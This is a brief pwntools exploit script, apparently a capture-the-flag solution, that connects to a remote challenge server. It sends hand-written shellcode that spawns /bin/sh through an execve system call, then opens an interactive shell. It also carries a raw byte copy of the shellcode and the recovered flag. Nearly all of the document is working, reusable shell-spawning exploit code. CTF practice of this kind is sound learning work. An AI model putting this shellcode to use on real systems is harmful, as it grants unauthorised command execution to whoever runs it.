from pwn import *

r = remote('edu-ctf.zoolab.org', 30202)

shellcode = asm('''
    xor    rax, rax
    push   rax
    mov    rbx, 0x68732f6e69622f2f
    shr    rbx, 0x8
    push   rbx
    mov    rbx, rsp
    push   rax
    push   rbx
    mov    rcx, rsp
    mov    al, 0xb
    int    0x80
''', arch='amd64')
#shellcode = b"\x48\x31\xC0\x50\x48\xBB\x2F\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE3\x50\x53\x48\x89\xE1\xB0\x0B\xCD\x80"

r.sendline(shellcode)
r.interactive()
#FLAG{It_is_a_bad_sandbox}